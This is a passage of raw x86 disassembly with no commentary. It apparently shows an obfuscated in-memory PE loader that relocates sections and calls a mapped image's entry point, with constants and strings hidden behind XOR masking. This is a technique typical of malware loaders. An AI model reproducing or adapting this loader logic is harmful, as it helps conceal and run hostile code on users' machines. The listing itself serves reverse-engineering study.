  41e965:	jne    0x41e98a
  41e967:	mov    eax,DWORD PTR [ebp-0x8]
  41e96a:	mov    ecx,DWORD PTR [ebp-0x20]
  41e96d:	xor    eax,esi
  41e96f:	xor    ecx,esi
  41e971:	lea    ebx,[ebx+eax*1+0x3272e2]
  41e978:	mov    eax,DWORD PTR [ebp+0x10]
  41e97b:	mov    eax,DWORD PTR [eax+0x1d8]
  41e981:	add    ecx,edi
  41e983:	imul   ecx,ebx
  41e986:	push   ecx
  41e987:	call   DWORD PTR [eax+0x24]
  41e98a:	mov    eax,DWORD PTR [ebp-0x4]
  41e98d:	xor    eax,esi
  41e98f:	add    eax,edi
  41e991:	cmp    eax,DWORD PTR [ebp-0xc]
  41e994:	jne    0x41e9a5
  41e996:	mov    eax,DWORD PTR [ebp-0x28]
  41e999:	xor    eax,esi
  41e99b:	add    eax,edi
  41e99d:	cmp    ebx,eax
  41e99f:	jbe    0x41e91f
  41e9a5:	mov    eax,DWORD PTR [ebp-0x4]
  41e9a8:	xor    eax,esi
  41e9aa:	add    eax,edi
  41e9ac:	cmp    eax,DWORD PTR [ebp-0xc]
  41e9af:	jne    0x41e9c8
  41e9b1:	mov    eax,DWORD PTR [ebp-0x8]
  41e9b4:	mov    ecx,DWORD PTR [ebp-0x18]
  41e9b7:	xor    eax,esi
  41e9b9:	lea    eax,[ecx+eax*1+0x3272e2]
  41e9c0:	mov    DWORD PTR [ebp-0x18],eax
  41e9c3:	jmp    0x41eab7
  41e9c8:	mov    DWORD PTR [ebp-0x14],0x1121b0d
  41e9cf:	mov    DWORD PTR [ebp+0xc],0xe042d0f
  41e9d6:	mov    ebx,DWORD PTR [ebp-0x4]
  41e9d9:	xor    ebx,esi
  41e9db:	add    ebx,edi
  41e9dd:	jmp    0x41eaa4
  41e9e2:	mov    eax,DWORD PTR [ebp-0x4]
  41e9e5:	xor    eax,esi
  41e9e7:	add    eax,edi
  41e9e9:	mov    DWORD PTR [ebp-0x14],eax
  41e9ec:	mov    eax,DWORD PTR [ebp-0x4]
  41e9ef:	xor    eax,esi
  41e9f1:	add    eax,edi
  41e9f3:	mov    DWORD PTR [ebp+0xc],eax
  41e9f6:	mov    ecx,DWORD PTR [ebp-0x4]
  41e9f9:	mov    eax,DWORD PTR [ebp-0x24]
  41e9fc:	xor    ecx,esi
  41e9fe:	add    ecx,edi
  41ea00:	cmp    ecx,eax
  41ea02:	je     0x41ea0a
  41ea04:	mov    eax,DWORD PTR [eax+ebx*4]
  41ea07:	mov    DWORD PTR [ebp-0x14],eax
  41ea0a:	mov    eax,DWORD PTR [ebp-0x1c]
  41ea0d:	mov    eax,DWORD PTR [eax+ebx*4]
  41ea10:	mov    DWORD PTR [ebp+0xc],eax
  41ea13:	mov    eax,DWORD PTR [ebp-0x4]
  41ea16:	mov    ecx,DWORD PTR [ebp-0x14]
  41ea19:	xor    eax,esi
  41ea1b:	add    eax,edi
  41ea1d:	cmp    eax,ecx
  41ea1f:	je     0x41ea4a
  41ea21:	mov    eax,DWORD PTR [ebp-0x4]
  41ea24:	mov    ecx,DWORD PTR [ebp-0x14]
  41ea27:	xor    eax,esi
  41ea29:	add    eax,edi
  41ea2b:	shr    ecx,0x1f
  41ea2e:	cmp    eax,ecx
  41ea30:	je     0x41ea4a
  41ea32:	mov    ecx,DWORD PTR [ebp-0x14]
  41ea35:	mov    eax,DWORD PTR [ebp+0x10]
  41ea38:	mov    eax,DWORD PTR [eax+0x1d8]
  41ea3e:	movzx  ecx,cx
  41ea41:	push   ecx
  41ea42:	push   DWORD PTR [ebp-0xc]
  41ea45:	call   DWORD PTR [eax+0x8]
  41ea48:	jmp    0x41ea63
  41ea4a:	mov    eax,DWORD PTR [ebp+0xc]
  41ea4d:	add    eax,DWORD PTR [ebp+0x8]
  41ea50:	mov    ecx,DWORD PTR [ebp+0x10]
  41ea53:	mov    ecx,DWORD PTR [ecx+0x1d8]
  41ea59:	add    eax,0x2
  41ea5c:	push   eax
  41ea5d:	push   DWORD PTR [ebp-0xc]
  41ea60:	call   DWORD PTR [ecx+0x8]
  41ea63:	mov    DWORD PTR [ebp+0xc],eax
  41ea66:	mov    eax,DWORD PTR [ebp-0x4]
  41ea69:	mov    ecx,DWORD PTR [ebp+0xc]
  41ea6c:	xor    eax,esi
  41ea6e:	add    eax,edi
  41ea70:	cmp    eax,ecx
  41ea72:	mov    eax,DWORD PTR [ebp-0x8]
  41ea75:	jne    0x41ea88
  41ea77:	mov    ecx,DWORD PTR [ebp-0x18]
  41ea7a:	xor    eax,esi
  41ea7c:	lea    eax,[ecx+eax*1+0x3272e2]
  41ea83:	mov    DWORD PTR [ebp-0x18],eax
  41ea86:	jmp    0x41ea98
  41ea88:	mov    ecx,DWORD PTR [ebp+0xc]
  41ea8b:	xor    eax,esi
  41ea8d:	add    eax,edi
  41ea8f:	imul   eax,ecx
  41ea92:	mov    ecx,DWORD PTR [ebp-0x1c]
  41ea95:	mov    DWORD PTR [ecx+ebx*4],eax
  41ea98:	mov    eax,DWORD PTR [ebp-0x8]
  41ea9b:	xor    eax,esi
  41ea9d:	lea    ebx,[ebx+eax*1+0x3272e2]
  41eaa4:	mov    eax,DWORD PTR [ebp-0x4]
  41eaa7:	mov    ecx,DWORD PTR [ebp-0x1c]
  41eaaa:	xor    eax,esi
  41eaac:	add    eax,edi
  41eaae:	cmp    DWORD PTR [ecx+ebx*4],eax
  41eab1:	jne    0x41e9e2
  41eab7:	mov    edx,DWORD PTR [ebp-0x10]
  41eaba:	mov    eax,DWORD PTR [ebp-0x18]
  41eabd:	mov    ecx,DWORD PTR [ebp-0x2c]
  41eac0:	sub    edx,0x3272e1
  41eac6:	xor    edx,esi
  41eac8:	jmp    0x41e892
  41eacd:	mov    ecx,DWORD PTR [ebp-0x4]
  41ead0:	xor    ecx,esi
  41ead2:	add    ecx,edi
  41ead4:	cmp    eax,ecx
  41ead6:	mov    eax,DWORD PTR [ebp-0x4]
  41ead9:	jne    0x41eae3
  41eadb:	mov    eax,DWORD PTR [ebp-0x8]
  41eade:	jmp    0x41eae3
  41eae0:	mov    eax,DWORD PTR [ebp-0x4]
  41eae3:	xor    eax,esi
  41eae5:	add    eax,edi
  41eae7:	pop    edi
  41eae8:	pop    esi
  41eae9:	pop    ebx
  41eaea:	leave  
  41eaeb:	ret    0xc
  41eaee:	push   ebp
  41eaef:	mov    ebp,esp
  41eaf1:	sub    esp,0x28
  41eaf4:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  41eafb:	mov    DWORD PTR [ebp-0x28],0xf89c8584
  41eb02:	mov    eax,DWORD PTR [ebp+0xc]
  41eb05:	mov    DWORD PTR [ebp+0xc],eax
  41eb08:	push   esi
  41eb09:	mov    eax,eax
  41eb0b:	mov    eax,DWORD PTR [ebp-0x4]
  41eb0e:	mov    esi,DWORD PTR [ebp+0x8]
  41eb11:	mov    ecx,0x751089b
  41eb16:	xor    eax,ecx
  41eb18:	mov    edx,0x3272e2
  41eb1d:	add    eax,edx
  41eb1f:	cmp    esi,eax
  41eb21:	je     0x41ec48
  41eb27:	mov    eax,DWORD PTR [ebp+0x8]
  41eb2a:	mov    esi,DWORD PTR [ebp+0x8]
  41eb2d:	add    esi,DWORD PTR [eax+0x3c]
  41eb30:	push   edi
  41eb31:	mov    DWORD PTR [ebp+0xc],esi
  41eb34:	mov    DWORD PTR [ebp-0x1c],0xf89c85b8
  41eb3b:	mov    eax,DWORD PTR [ebp-0x1c]
  41eb3e:	mov    esi,DWORD PTR [ebp-0x4]
  41eb41:	mov    edi,DWORD PTR [ebp+0xc]
  41eb44:	xor    esi,ecx
  41eb46:	xor    eax,ecx
  41eb48:	add    esi,edx
  41eb4a:	cmp    DWORD PTR [edi+eax*8+0x1939788],esi
  41eb51:	je     0x41ec42
  41eb57:	mov    esi,DWORD PTR [ebp+0xc]
  41eb5a:	mov    eax,DWORD PTR [ebp+0x8]
  41eb5d:	add    eax,DWORD PTR [esi+0xa0]
  41eb63:	mov    esi,DWORD PTR [ebp+0x8]
  41eb66:	mov    edi,DWORD PTR [ebp+0xc]
  41eb69:	sub    esi,DWORD PTR [edi+0x34]
  41eb6c:	mov    edi,DWORD PTR [ebp-0x4]
  41eb6f:	xor    edi,ecx
  41eb71:	add    edi,edx
  41eb73:	mov    DWORD PTR [ebp-0x24],esi
  41eb76:	cmp    esi,edi
  41eb78:	je     0x41ec42
  41eb7e:	mov    esi,DWORD PTR [ebp-0x4]
  41eb81:	xor    esi,ecx
  41eb83:	add    esi,edx
  41eb85:	mov    DWORD PTR [ebp-0x8],esi
  41eb88:	push   ebx
  41eb89:	mov    DWORD PTR [ebp-0x10],0xf89c85ba
  41eb90:	jmp    0x41ec2c
  41eb95:	mov    esi,DWORD PTR [ebp-0x4]
  41eb98:	xor    esi,ecx
  41eb9a:	lea    edi,[ebx-0x8]
  41eb9d:	add    esi,edx
  41eb9f:	shr    edi,1
  41eba1:	cmp    esi,edi
  41eba3:	jae    0x41ec12
  41eba5:	sub    edi,esi
  41eba7:	lea    ebx,[eax+esi*2+0x8]
  41ebab:	mov    DWORD PTR [ebp-0x18],edi
  41ebae:	movzx  esi,WORD PTR [ebx]
  41ebb1:	and    esi,0xfff
  41ebb7:	mov    DWORD PTR [ebp-0x14],esi
  41ebba:	mov    edi,DWORD PTR [ebp-0x14]
  41ebbd:	mov    esi,DWORD PTR [eax]
  41ebbf:	sub    esi,edx
  41ebc1:	add    edi,esi
  41ebc3:	movzx  esi,WORD PTR [ebx]
  41ebc6:	shr    esi,0xc
  41ebc9:	xor    edi,ecx
  41ebcb:	mov    DWORD PTR [ebp-0x20],edi
  41ebce:	mov    DWORD PTR [ebp-0x14],esi
  41ebd1:	mov    esi,DWORD PTR [ebp-0x20]
  41ebd4:	mov    edi,DWORD PTR [ebp+0x8]
  41ebd7:	xor    esi,ecx
  41ebd9:	lea    esi,[esi+edi*1+0x3272e2]
  41ebe0:	mov    DWORD PTR [ebp-0x20],esi
  41ebe3:	mov    esi,DWORD PTR [ebp-0x10]
  41ebe6:	mov    edi,DWORD PTR [ebp-0x14]
  41ebe9:	xor    esi,ecx
  41ebeb:	add    esi,edx
  41ebed:	cmp    edi,esi
  41ebef:	jne    0x41ec07
  41ebf1:	mov    esi,DWORD PTR [ebp-0x10]
  41ebf4:	mov    edi,DWORD PTR [ebp-0x14]
  41ebf7:	xor    esi,ecx
  41ebf9:	add    esi,edx
  41ebfb:	cmp    edi,esi
  41ebfd:	jne    0x41ec07
  41ebff:	mov    esi,DWORD PTR [ebp-0x20]
  41ec02:	mov    edi,DWORD PTR [ebp-0x24]
  41ec05:	add    DWORD PTR [esi],edi
  41ec07:	add    ebx,0x2
  41ec0a:	dec    DWORD PTR [ebp-0x18]
  41ec0d:	jne    0x41ebae
  41ec0f:	mov    ebx,DWORD PTR [ebp-0xc]
  41ec12:	add    DWORD PTR [ebp-0x8],ebx
  41ec15:	mov    esi,DWORD PTR [ebp-0x1c]
  41ec18:	mov    edi,DWORD PTR [ebp-0x8]
  41ec1b:	mov    ebx,DWORD PTR [ebp+0xc]
  41ec1e:	xor    esi,ecx
  41ec20:	cmp    edi,DWORD PTR [ebx+esi*8+0x193978c]
  41ec27:	jae    0x41ec41
  41ec29:	add    eax,DWORD PTR [ebp-0xc]
  41ec2c:	mov    esi,DWORD PTR [ebp-0x4]
  41ec2f:	mov    ebx,DWORD PTR [eax+0x4]
  41ec32:	xor    esi,ecx
  41ec34:	add    esi,edx
  41ec36:	mov    DWORD PTR [ebp-0xc],ebx
  41ec39:	cmp    ebx,esi
  41ec3b:	jne    0x41eb95
  41ec41:	pop    ebx
  41ec42:	mov    eax,DWORD PTR [ebp-0x28]
  41ec45:	pop    edi
  41ec46:	jmp    0x41ec4b
  41ec48:	mov    eax,DWORD PTR [ebp-0x4]
  41ec4b:	xor    eax,ecx
  41ec4d:	add    eax,edx
  41ec4f:	pop    esi
  41ec50:	leave  
  41ec51:	ret    0x8
  41ec54:	push   ebp
  41ec55:	mov    ebp,esp
  41ec57:	sub    esp,0xcc
  41ec5d:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  41ec64:	mov    DWORD PTR [ebp-0x24],0xf89c8584
  41ec6b:	mov    eax,DWORD PTR [ebp-0x4]
  41ec6e:	push   ebx
  41ec6f:	push   esi
  41ec70:	mov    esi,0x751089b
  41ec75:	xor    eax,esi
  41ec77:	push   edi
  41ec78:	mov    edi,0x3272e2
  41ec7d:	add    eax,edi
  41ec7f:	mov    DWORD PTR [ebp-0x1c],eax
  41ec82:	mov    eax,DWORD PTR [ebp-0x4]
  41ec85:	xor    eax,esi
  41ec87:	add    eax,edi
  41ec89:	mov    DWORD PTR [ebp-0x8],eax
  41ec8c:	mov    ebx,DWORD PTR [ebp+0x20]
  41ec8f:	mov    eax,DWORD PTR [ebp-0x14]
  41ec92:	mov    ecx,DWORD PTR [ebp-0x14]
  41ec95:	xor    eax,ecx
  41ec97:	mov    DWORD PTR [ebp-0x14],eax
  41ec9a:	add    DWORD PTR [ebp-0x14],0xf89cb585
  41eca1:	mov    eax,DWORD PTR [ebp-0xc]
  41eca4:	mov    ecx,DWORD PTR [ebp-0xc]
  41eca7:	xor    eax,ecx
  41eca9:	mov    DWORD PTR [ebp-0xc],eax
  41ecac:	add    DWORD PTR [ebp-0xc],0xf89c85c5
  41ecb3:	mov    eax,DWORD PTR [ebp-0x10]
  41ecb6:	mov    ecx,DWORD PTR [ebp-0x10]
  41ecb9:	xor    eax,ecx
  41ecbb:	mov    DWORD PTR [ebp-0x10],eax
  41ecbe:	add    DWORD PTR [ebp-0x10],0xf89c85b9
  41ecc5:	mov    eax,DWORD PTR [ebp-0x20]
  41ecc8:	mov    ecx,DWORD PTR [ebp-0x20]
  41eccb:	xor    eax,ecx
  41eccd:	mov    DWORD PTR [ebp-0x20],eax
  41ecd0:	add    DWORD PTR [ebp-0x20],0xf89f0585
  41ecd7:	mov    eax,0x9471
  41ecdc:	mov    WORD PTR [ebp+0x20],ax
  41ece0:	mov    eax,DWORD PTR [ebp+0x8]
  41ece3:	test   eax,eax
  41ece5:	je     0x41f140
  41eceb:	mov    eax,DWORD PTR [ebp+0xc]
  41ecee:	test   eax,eax
  41ecf0:	je     0x41f140
  41ecf6:	mov    eax,DWORD PTR [ebp+0x18]
  41ecf9:	test   eax,eax
  41ecfb:	je     0x41f140
  41ed01:	mov    ax,WORD PTR [ebp+0x20]
  41ed05:	mov    ecx,0x8a8d
  41ed0a:	xor    ax,cx
  41ed0d:	mov    ecx,0x3b51
  41ed12:	add    ax,cx
  41ed15:	mov    ecx,DWORD PTR [ebp+0x8]
  41ed18:	cmp    WORD PTR [ecx],ax
  41ed1b:	jne    0x41f140
  41ed21:	mov    eax,DWORD PTR [ebp-0x4]
  41ed24:	xor    eax,esi
  41ed26:	add    eax,edi
  41ed28:	mov    DWORD PTR [ebp-0x30],eax
  41ed2b:	mov    eax,DWORD PTR [ebp-0x4]
  41ed2e:	mov    ecx,DWORD PTR [ebp+0x8]
  41ed31:	mov    eax,DWORD PTR [ebp+0x8]
  41ed34:	add    eax,DWORD PTR [ecx+0x3c]
  41ed37:	mov    DWORD PTR [ebp+0xc],eax
  41ed3a:	mov    eax,DWORD PTR [eax+0x50]
  41ed3d:	test   eax,eax
  41ed3f:	je     0x41f140
  41ed45:	mov    DWORD PTR [ebp-0x2c],0xf88c8585
  41ed4c:	mov    eax,DWORD PTR [ebp-0x2c]
  41ed4f:	xor    eax,esi
  41ed51:	add    eax,edi
  41ed53:	mov    DWORD PTR [ebp-0x2c],eax
  41ed56:	mov    eax,DWORD PTR [ebp-0x4]
  41ed59:	mov    eax,DWORD PTR [ebx+0x190]
  41ed5f:	mov    ecx,DWORD PTR [eax]
  41ed61:	mov    ecx,DWORD PTR [ecx+0x3c]
  41ed64:	add    ecx,DWORD PTR [eax]
  41ed66:	mov    eax,DWORD PTR [ebp-0x4]
  41ed69:	mov    eax,DWORD PTR [ebx+0x18c]
  41ed6f:	mov    edx,DWORD PTR [eax]
  41ed71:	mov    DWORD PTR [ebp-0x18],ecx
  41ed74:	mov    DWORD PTR [ebp+0x20],edx
  41ed77:	cmp    edx,edx
  41ed79:	jne    0x41edad
  41ed7b:	mov    eax,DWORD PTR [ebx+0x1d8]
  41ed81:	lea    edx,[ebp-0x1c]
  41ed84:	push   edx
  41ed85:	mov    edx,DWORD PTR [ebp-0xc]
  41ed88:	xor    edx,esi
  41ed8a:	add    edx,edi
  41ed8c:	push   edx
  41ed8d:	push   DWORD PTR [ecx+0x50]
  41ed90:	push   DWORD PTR [ebp+0x20]
  41ed93:	call   DWORD PTR [eax+0x1c]
  41ed96:	mov    eax,DWORD PTR [ebp-0x18]
  41ed99:	mov    ecx,DWORD PTR [eax+0x54]
  41ed9c:	mov    eax,DWORD PTR [eax+0x50]
  41ed9f:	sub    eax,ecx
  41eda1:	add    ecx,DWORD PTR [ebp+0x20]
  41eda4:	push   ecx
  41eda5:	call   0x41f72c
  41edaa:	mov    edx,DWORD PTR [ebp+0x20]
  41edad:	mov    eax,DWORD PTR [ebx+0x194]
  41edb3:	mov    DWORD PTR [eax],edx
  41edb5:	mov    eax,DWORD PTR [ebp+0xc]
  41edb8:	push   DWORD PTR [eax+0x54]
  41edbb:	push   DWORD PTR [ebp+0x8]
  41edbe:	push   edx
  41edbf:	call   0x41f5d3
  41edc4:	mov    ecx,DWORD PTR [ebp+0x20]
  41edc7:	mov    eax,DWORD PTR [ecx+0x3c]
  41edca:	add    eax,ecx
  41edcc:	movzx  ecx,WORD PTR [eax+0x14]
  41edd0:	lea    ecx,[ecx+eax*1+0x18]
  41edd4:	mov    DWORD PTR [ebp+0x18],ecx
  41edd7:	mov    ecx,DWORD PTR [ebp-0x4]
  41edda:	movzx  edx,WORD PTR [eax+0x6]
  41edde:	xor    ecx,esi
  41ede0:	add    ecx,edi
  41ede2:	mov    DWORD PTR [ebp+0xc],eax
  41ede5:	cmp    edx,ecx
  41ede7:	je     0x41ee94
  41eded:	mov    ecx,DWORD PTR [ebp-0x4]
  41edf0:	xor    ecx,esi
  41edf2:	add    ecx,edi
  41edf4:	mov    DWORD PTR [ebp-0x8],ecx
  41edf7:	mov    ecx,DWORD PTR [ebp-0x24]
  41edfa:	movzx  edx,WORD PTR [eax+0x6]
  41edfe:	xor    ecx,esi
  41ee00:	sub    edx,ecx
  41ee02:	sub    edx,edi
  41ee04:	cmp    DWORD PTR [ebp-0x8],edx
  41ee07:	ja     0x41ee94
  41ee0d:	mov    edx,DWORD PTR [ebp+0x18]
  41ee10:	add    edx,0x8
  41ee13:	mov    DWORD PTR [ebp+0x18],edx
  41ee16:	jmp    0x41ee1b
  41ee18:	mov    edx,DWORD PTR [ebp+0x18]
  41ee1b:	mov    eax,DWORD PTR [eax+0x38]
  41ee1e:	lea    ecx,[eax-0x1]
  41ee21:	mov    DWORD PTR [ebp-0x34],eax
  41ee24:	mov    eax,DWORD PTR [edx]
  41ee26:	test   ecx,eax
  41ee28:	je     0x41ee31
  41ee2a:	not    ecx
  41ee2c:	and    eax,ecx
  41ee2e:	add    eax,DWORD PTR [ebp-0x34]
  41ee31:	mov    ecx,DWORD PTR [edx+0x4]
  41ee34:	add    ecx,DWORD PTR [ebp+0x20]
  41ee37:	push   ecx
  41ee38:	call   0x41f72c
  41ee3d:	mov    edx,DWORD PTR [ebp-0x4]
  41ee40:	mov    eax,DWORD PTR [ebp+0x18]
  41ee43:	mov    ecx,DWORD PTR [eax+0x8]
  41ee46:	xor    edx,esi
  41ee48:	add    edx,edi
  41ee4a:	cmp    ecx,edx
  41ee4c:	je     0x41ee65
  41ee4e:	push   ecx
  41ee4f:	mov    ecx,DWORD PTR [ebp+0x8]
  41ee52:	add    ecx,DWORD PTR [eax+0xc]
  41ee55:	mov    eax,DWORD PTR [eax+0x4]
  41ee58:	add    eax,DWORD PTR [ebp+0x20]
  41ee5b:	push   ecx
  41ee5c:	push   eax
  41ee5d:	call   0x41f5d3
  41ee62:	mov    eax,DWORD PTR [ebp+0x18]
  41ee65:	mov    ecx,DWORD PTR [ebp-0x24]
  41ee68:	mov    edx,DWORD PTR [ebp-0x8]
  41ee6b:	add    eax,0x28
  41ee6e:	xor    ecx,esi
  41ee70:	lea    ecx,[edx+ecx*1+0x3272e2]
  41ee77:	mov    edx,DWORD PTR [ebp+0xc]
  41ee7a:	mov    DWORD PTR [ebp+0x18],eax
  41ee7d:	mov    eax,DWORD PTR [ebp-0x24]
  41ee80:	movzx  edx,WORD PTR [edx+0x6]
  41ee84:	xor    eax,esi
  41ee86:	sub    edx,eax
  41ee88:	mov    eax,DWORD PTR [ebp+0xc]
  41ee8b:	sub    edx,edi
  41ee8d:	mov    DWORD PTR [ebp-0x8],ecx
  41ee90:	cmp    ecx,edx
  41ee92:	jbe    0x41ee18
  41ee94:	mov    edx,DWORD PTR [ebx+0x18c]
  41ee9a:	mov    ecx,DWORD PTR [ebp+0x20]
  41ee9d:	cmp    ecx,DWORD PTR [edx]
  41ee9f:	jne    0x41eec8
  41eea1:	mov    eax,DWORD PTR [ebx+0x1d8]
  41eea7:	lea    edx,[ebp-0x1c]
  41eeaa:	push   edx
  41eeab:	mov    edx,DWORD PTR [ebp-0x10]
  41eeae:	xor    edx,esi
  41eeb0:	add    edx,edi
  41eeb2:	push   edx
  41eeb3:	mov    edx,DWORD PTR [ebp-0x18]
  41eeb6:	push   DWORD PTR [edx+0x54]
  41eeb9:	push   ecx
  41eeba:	call   DWORD PTR [eax+0x1c]
  41eebd:	test   eax,eax
  41eebf:	je     0x41f131
  41eec5:	mov    eax,DWORD PTR [ebp+0xc]
  41eec8:	mov    ecx,DWORD PTR [ebx+0x1c8]
  41eece:	mov    ecx,DWORD PTR [ecx]
  41eed0:	xor    ecx,esi
  41eed2:	add    ecx,edi
  41eed4:	je     0x41f05c
  41eeda:	and    DWORD PTR [ebp-0x28],0x0
  41eede:	and    DWORD PTR [ebp+0x8],0x0
  41eee2:	mov    eax,0xf89c8519
  41eee7:	lea    ecx,[eax-0x8]
  41eeea:	mov    DWORD PTR [ebp-0x4c],0xf89c8517
  41eef1:	mov    DWORD PTR [ebp-0x48],0xf89c8509
  41eef8:	mov    DWORD PTR [ebp-0x44],eax
  41eefb:	mov    DWORD PTR [ebp-0x40],ecx
  41eefe:	mov    DWORD PTR [ebp-0x3c],ecx
  41ef01:	mov    DWORD PTR [ebp-0x38],0xf89c8585
  41ef08:	mov    edx,DWORD PTR [ebp+0x8]
  41ef0b:	mov    ecx,0x89b
  41ef10:	xor    cx,WORD PTR [ebp+edx*4-0x4c]
  41ef15:	mov    edx,0x72e2
  41ef1a:	add    cx,dx
  41ef1d:	mov    edx,DWORD PTR [ebp+0x8]
  41ef20:	inc    DWORD PTR [ebp+0x8]
  41ef23:	cmp    DWORD PTR [ebp+0x8],0x6
  41ef27:	mov    WORD PTR [ebp+edx*2-0xb4],cx
  41ef2f:	jb     0x41ef08
  41ef31:	mov    ecx,0xf89c850b
  41ef36:	mov    DWORD PTR [ebp-0xa4],eax
  41ef3c:	mov    DWORD PTR [ebp-0x90],eax
  41ef42:	mov    DWORD PTR [ebp-0x68],eax
  41ef45:	mov    DWORD PTR [ebp-0x64],eax
  41ef48:	lea    eax,[ecx-0x1]
  41ef4b:	mov    edx,0xf89c85ff
  41ef50:	mov    DWORD PTR [ebp-0x58],eax
  41ef53:	mov    DWORD PTR [ebp-0x54],eax
  41ef56:	mov    DWORD PTR [ebp-0xa8],0xf89c85f1
  41ef60:	mov    DWORD PTR [ebp-0xa0],ecx
  41ef66:	mov    DWORD PTR [ebp-0x9c],edx
  41ef6c:	mov    DWORD PTR [ebp-0x98],0xf89c851c
  41ef76:	mov    DWORD PTR [ebp-0x94],0xf89c8517
  41ef80:	mov    DWORD PTR [ebp-0x8c],0xf89c85f8
  41ef8a:	mov    DWORD PTR [ebp-0x88],0xf89c8517
  41ef94:	mov    DWORD PTR [ebp-0x84],0xf89c8509
  41ef9e:	mov    DWORD PTR [ebp-0x80],ecx
  41efa1:	mov    DWORD PTR [ebp-0x7c],0xf89c850c
  41efa8:	mov    DWORD PTR [ebp-0x78],edx
  41efab:	mov    DWORD PTR [ebp-0x74],0xf89c8516
  41efb2:	mov    DWORD PTR [ebp-0x70],ecx
  41efb5:	mov    DWORD PTR [ebp-0x6c],0xf89c85c4
  41efbc:	mov    DWORD PTR [ebp-0x60],ecx
  41efbf:	mov    DWORD PTR [ebp-0x5c],0xf89c8518
  41efc6:	mov    DWORD PTR [ebp-0x50],0xf89c8585
  41efcd:	xor    eax,eax
  41efcf:	mov    cl,BYTE PTR [ebp+eax*4-0xa8]
  41efd6:	xor    cl,0x9b
  41efd9:	sub    cl,0x1e
  41efdc:	mov    BYTE PTR [ebp+eax*1-0xcc],cl
  41efe3:	inc    eax
  41efe4:	cmp    eax,0x17
  41efe7:	jb     0x41efcf
  41efe9:	mov    eax,DWORD PTR [ebx+0x1d8]
  41efef:	lea    ecx,[ebp-0xb4]
  41eff5:	push   ecx
  41eff6:	call   DWORD PTR [eax+0x4]
  41eff9:	mov    ecx,DWORD PTR [ebx+0x1d8]
  41efff:	lea    edx,[ebp-0xcc]
  41f005:	push   edx
  41f006:	push   eax
  41f007:	call   DWORD PTR [ecx+0x8]
  41f00a:	lea    ecx,[ebp-0x28]
  41f00d:	push   ecx
  41f00e:	mov    ecx,DWORD PTR [ebx+0x18c]
  41f014:	push   DWORD PTR [ecx]
  41f016:	call   eax
  41f018:	mov    eax,DWORD PTR [ebp-0x28]
  41f01b:	test   eax,eax
  41f01d:	je     0x41f059
  41f01f:	mov    DWORD PTR [ebp+0x8],eax
  41f022:	jmp    0x41f02e
  41f024:	mov    eax,DWORD PTR [eax]
  41f026:	mov    DWORD PTR [ebp-0x28],eax
  41f029:	cmp    eax,DWORD PTR [ebp+0x8]
  41f02c:	je     0x41f03b
  41f02e:	mov    edx,DWORD PTR [eax+0x18]
  41f031:	mov    ecx,DWORD PTR [ebx+0x18c]
  41f037:	cmp    edx,DWORD PTR [ecx]
  41f039:	jne    0x41f024
  41f03b:	mov    edx,DWORD PTR [eax+0x18]
  41f03e:	mov    ecx,DWORD PTR [ebx+0x18c]
  41f044:	cmp    edx,DWORD PTR [ecx]
  41f046:	jne    0x41f059
  41f048:	mov    edx,DWORD PTR [ebp-0x18]
  41f04b:	mov    ecx,DWORD PTR [ebx+0x190]
  41f051:	mov    edx,DWORD PTR [edx+0x28]
  41f054:	add    edx,DWORD PTR [ecx]
  41f056:	mov    DWORD PTR [eax+0x1c],edx
  41f059:	mov    eax,DWORD PTR [ebp+0xc]
  41f05c:	push   ebx
  41f05d:	push   eax
  41f05e:	push   DWORD PTR [ebp+0x20]
  41f061:	call   0x41e80b
  41f066:	test   eax,eax
  41f068:	je     0x41f131
  41f06e:	push   DWORD PTR [ebp+0xc]
  41f071:	mov    ecx,ebx
  41f073:	push   DWORD PTR [ebp+0x20]
  41f076:	call   0x41e764
  41f07b:	test   eax,eax
  41f07d:	je     0x41f131
  41f083:	mov    eax,DWORD PTR [ebp+0xc]
  41f086:	mov    edx,DWORD PTR [ebp+0x20]
  41f089:	mov    ecx,ebx
  41f08b:	call   0x41e63d
  41f090:	test   eax,eax
  41f092:	je     0x41f131
  41f098:	push   ebx
  41f099:	push   DWORD PTR [ebp+0x20]
  41f09c:	call   0x41eaee
  41f0a1:	test   eax,eax
  41f0a3:	je     0x41f131
  41f0a9:	mov    eax,DWORD PTR [ebx+0x18c]
  41f0af:	mov    edx,DWORD PTR [ebp+0x20]
  41f0b2:	cmp    edx,DWORD PTR [eax]
  41f0b4:	jne    0x41f0d0
  41f0b6:	mov    eax,DWORD PTR [ebx+0x1d8]
  41f0bc:	lea    ecx,[ebp-0x1c]
  41f0bf:	push   ecx
  41f0c0:	push   DWORD PTR [ebp-0x1c]
  41f0c3:	mov    ecx,DWORD PTR [ebp-0x18]
  41f0c6:	push   DWORD PTR [ecx+0x54]
  41f0c9:	push   edx
  41f0ca:	call   DWORD PTR [eax+0x1c]
  41f0cd:	mov    edx,DWORD PTR [ebp+0x20]
  41f0d0:	mov    eax,DWORD PTR [ebx+0x1c8]
  41f0d6:	mov    eax,DWORD PTR [eax]
  41f0d8:	xor    eax,esi
  41f0da:	add    eax,edi
  41f0dc:	je     0x41f115
  41f0de:	mov    ecx,DWORD PTR [ebp+0xc]
  41f0e1:	mov    eax,DWORD PTR [ecx+0x28]
  41f0e4:	mov    DWORD PTR [ebp+0x8],0xf89ca585
  41f0eb:	mov    esi,DWORD PTR [ebp+0x8]
  41f0ee:	push   DWORD PTR [ebp+0x14]
  41f0f1:	xor    esi,0x89b
  41f0f7:	push   DWORD PTR [ebp+0x10]
  41f0fa:	add    esi,0x72e2
  41f100:	or     WORD PTR [ecx+0x16],si
  41f104:	add    eax,edx
  41f106:	push   edx
  41f107:	call   eax
  41f109:	mov    DWORD PTR [ebx+0x1d0],0xf89c8584
  41f113:	jmp    0x41f11f
  41f115:	mov    eax,DWORD PTR [ebp+0xc]
  41f118:	mov    eax,DWORD PTR [eax+0x28]
  41f11b:	add    eax,edx
  41f11d:	call   eax
  41f11f:	mov    DWORD PTR [ebp-0x8],eax
  41f122:	mov    eax,DWORD PTR [ebp-0x8]
  41f125:	mov    ecx,DWORD PTR [ebp+0x1c]
  41f128:	mov    DWORD PTR [ecx],eax
  41f12a:	mov    DWORD PTR [ebp-0x30],0x1
  41f131:	cmp    DWORD PTR [ebp-0x30],0x0
  41f135:	jne    0x41f13b
  41f137:	and    DWORD PTR [ebp+0x20],0x0
  41f13b:	mov    eax,DWORD PTR [ebp+0x20]
  41f13e:	jmp    0x41f142
  41f140:	xor    eax,eax
  41f142:	pop    edi
